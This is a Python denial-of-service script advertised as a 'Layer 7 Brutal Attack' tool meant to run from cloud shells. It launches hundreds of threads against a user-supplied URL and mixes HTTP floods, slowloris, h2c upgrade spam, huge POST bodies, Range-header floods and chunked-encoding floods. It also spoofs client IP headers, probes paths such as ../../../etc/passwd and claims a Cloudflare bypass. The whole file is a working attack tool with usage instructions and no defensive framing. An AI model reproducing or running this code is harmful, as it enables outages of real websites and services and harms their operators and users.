#!/usr/bin/env python3
# CloudShell DDoS Tool - Layer 7 Brutal Attack
# Fully compatible with Google Cloud Shell, AWS CloudShell, Azure Cloud Shell

import threading
import socket
import ssl
import random
import time
import urllib.parse
import sys
import os
import requests
from urllib3 import PoolManager, HTTPConnectionPool
import http.client

target_url = ""
target_host = ""
target_port = 443
threads = 500
duration = 60
running = True

def generate_payload():
    """Generate random payload untuk bypass WAF dan menciptakan 505"""
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
    paths = [
        "/", "/wp-admin", "/api", "/v1", "/graphql", "/cgi-bin", "/.env",
        "/backup", "/config", "/admin", "/login", "/phpmyadmin", "/vendor",
        "/tmp", "/dev/null", "../../../etc/passwd", "/proc/self/environ"
    ]
    
    rand_method = random.choice(methods)
    rand_path = random.choice(paths)
    random_query = "?" + "&".join([f"{random.randbytes(5).hex()}={random.randbytes(10).hex()}" for _ in range(50)])
    
    # Header untuk memicu 505 (HTTP Version Not Supported)
    headers = {
        f"X-{random.randbytes(8).hex()}": random.randbytes(500).hex(),
        "User-Agent": f"Mozilla/5.0 ({'Windows NT 10.0; Win64; x64' if random.random() > 0.5 else 'X11; Linux x86_64'}) AppleWebKit/{random.randint(500, 600)}.{random.randint(0, 50)} Chrome/{random.randint(90, 120)}.0.{random.randint(3000, 5000)}.{random.randint(0, 200)} Safari/{random.randint(500, 600)}.{random.randint(0, 50)}",
        "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "*/*", "application/json"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "identity", "*"]),
        "Accept-Language": "en-US,en;q=0.9," + random.choice(["id", "ms", "zh", "ja"]) + ";q=0.8",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Connection": random.choice(["keep-alive", "close", "Upgrade"]),
        "Content-Length": str(random.randint(0, 999999)),
        "Expect": "100-continue",
        "Transfer-Encoding": "chunked" if random.random() > 0.7 else "identity",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    }
    
    # Header khusus untuk memicu 505
    if random.random() > 0.8:
        headers["HTTP-Version"] = random.choice(["HTTP/2.5", "HTTP/1.9", "HTTP/3.3", "HTTP/0.9", "HTTP/2.0-beta"])
    
    return rand_method, rand_path + random_query, headers

def http_flood():
    """HTTP/1.1 flood dengan socket raw"""
    global running
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target_host, target_port))
        if target_port == 443:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target_host)
        
        while running:
            method, path, headers = generate_payload()
            request = f"{method} {path} HTTP/1.1\r\n"
            request += f"Host: {target_host}\r\n"
            for key, value in headers.items():
                request += f"{key}: {value}\r\n"
            request += "\r\n"
            
            if random.random() > 0.9:
                request += random.randbytes(random.randint(1000, 50000)).hex()
            
            sock.send(request.encode())
            
            try:
                response = sock.recv(1024)
                if b"505" in response or b"HTTP Version Not Supported" in response:
                    print(f"[505] {target_host} response with HTTP version error")
            except:
                pass
            
            time.sleep(random.uniform(0.001, 0.01))
            
    except:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

def cloudflare_bypass():
    """Bypass Cloudflare dengan cookie dan header khusus"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    })
    
    try:
        resp = session.get(f"http://{target_host}/")
        return resp.cookies
    except:
        return None

def slowloris_attack():
    """Slowloris style attack untuk memenuhi koneksi"""
    global running
    sockets = []
    while running and len(sockets) < 5000:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_host, target_port))
            sock.send(f"GET /{random.randbytes(8).hex()} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target_host}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            sock.send("Accept: */*\r\n".encode())
            sock.send("Connection: keep-alive\r\n".encode())
            sock.send(f"X-{random.randbytes(16).hex()}: {random.randbytes(1000).hex()}\r\n".encode())
            sockets.append(sock)
        except:
            break
    
    while running:
        for sock in sockets:
            try:
                sock.send(f"X-{random.randbytes(8).hex()}: {random.randbytes(500).hex()}\r\n".encode())
            except:
                sockets.remove(sock)
        time.sleep(15)

def http2_crash():
    """Trigger HTTP/2 crash dengan header invalid"""
    global running
    while running:
        try:
            conn = http.client.HTTPSConnection(target_host, timeout=3)
            conn.request("PRI", "*", headers={
                "Connection": "Upgrade, HTTP2-Settings",
                "Upgrade": "h2c",
                "HTTP2-Settings": random.randbytes(100).hex()
            })
            conn.getresponse()
        except:
            pass

def massive_post_flood():
    """POST flood dengan payload besar untuk memicu 505"""
    global running
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_host, target_port))
            if target_port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_host)
            
            payload = "---WebKitFormBoundary" + random.randbytes(16).hex() + "\r\n"
            payload += "Content-Disposition: form-data; name=\"file\"; filename=\"" + random.randbytes(32).hex() + ".bin\"\r\n"
            payload += "Content-Type: application/octet-stream\r\n\r\n"
            payload += random.randbytes(50000).hex() + "\r\n"
            payload += "---WebKitFormBoundary" + random.randbytes(16).hex() + "--\r\n"
            
            request = f"POST /{random.randbytes(8).hex()} HTTP/1.1\r\n"
            request += f"Host: {target_host}\r\n"
            request += "Content-Type: multipart/form-data; boundary=---WebKitFormBoundary" + random.randbytes(16).hex() + "\r\n"
            request += f"Content-Length: {len(payload)}\r\n"
            request += "Expect: 100-continue\r\n"
            request += "Transfer-Encoding: chunked\r\n\r\n"
            request += payload
            
            sock.send(request.encode())
            
            try:
                response = sock.recv(4096)
                if b"505" in response:
                    print(f"[505] Triggered on POST request")
            except:
                pass
                
        except:
            pass

def range_flood():
    """Range header flood untuk fragmentasi response"""
    global running
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_host, target_port))
            if target_port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_host)
            
            ranges = []
            for _ in range(100):
                start = random.randint(0, 99999999)
                end = start + random.randint(1000, 100000)
                ranges.append(f"bytes={start}-{end}")
            
            request = f"GET / HTTP/1.1\r\n"
            request += f"Host: {target_host}\r\n"
            request += "Range: " + ", ".join(ranges) + "\r\n"
            request += "If-Range: " + random.randbytes(100).hex() + "\r\n"
            request += "Accept-Ranges: bytes\r\n\r\n"
            
            sock.send(request.encode())
        except:
            pass

def chunked_exploit():
    """Chunked transfer encoding exploit"""
    global running
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_host, target_port))
            if target_port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_host)
            
            request = f"POST / HTTP/1.1\r\n"
            request += f"Host: {target_host}\r\n"
            request += "Transfer-Encoding: chunked\r\n"
            request += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            
            for _ in range(100):
                chunk_size = random.randint(1, 1000)
                request += f"{hex(chunk_size)[2:]}\r\n"
                request += random.randbytes(chunk_size).hex() + "\r\n"
            
            request += "0\r\n\r\n"
            sock.send(request.encode())
        except:
            pass

def main():
    global target_url, target_host, target_port, threads, duration, running
    
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║     CloudShell DDoS Tool - Layer 7 Brutal Attack     ║
    ║        505 HTTP Version Not Supported Exploit        ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) < 2:
        print("Usage: python3 ddos.py <url> <threads> <duration>")
        print("Example: python3 ddos.py https://target.com 1000 60")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parsed = urllib.parse.urlparse(target_url)
    target_host = parsed.hostname
    target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
    
    if len(sys.argv) >= 3:
        threads = int(sys.argv[2])
    if len(sys.argv) >= 4:
        duration = int(sys.argv[3])
    
    print(f"[Target] {target_host}:{target_port}")
    print(f"[Threads] {threads}")
    print(f"[Duration] {duration}s")
    print("[Attack] Layer 7 - 505 Brutal Mode")
    
    # Bypass Cloudflare
    cf_cookies = cloudflare_bypass()
    if cf_cookies:
        print("[Bypass] Cloudflare cookie acquired")
    
    print("[*] Starting attack...")
    
    # Start threads
    threads_list = []
    for _ in range(threads):
        t_type = random.choice(['http', 'slowloris', 'http2', 'post', 'range', 'chunked'])
        if t_type == 'http':
            t = threading.Thread(target=http_flood)
        elif t_type == 'slowloris':
            t = threading.Thread(target=slowloris_attack)
        elif t_type == 'http2':
            t = threading.Thread(target=http2_crash)
        elif t_type == 'post':
            t = threading.Thread(target=massive_post_flood)
        elif t_type == 'range':
            t = threading.Thread(target=range_flood)
        else:
            t = threading.Thread(target=chunked_exploit)
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    # Duration timer
    time.sleep(duration)
    running = False
    
    print(f"[*] Attack finished. Total threads: {threads}")
    print(f"[*] Target might respond with 505 errors")

if __name__ == "__main__":
    main()
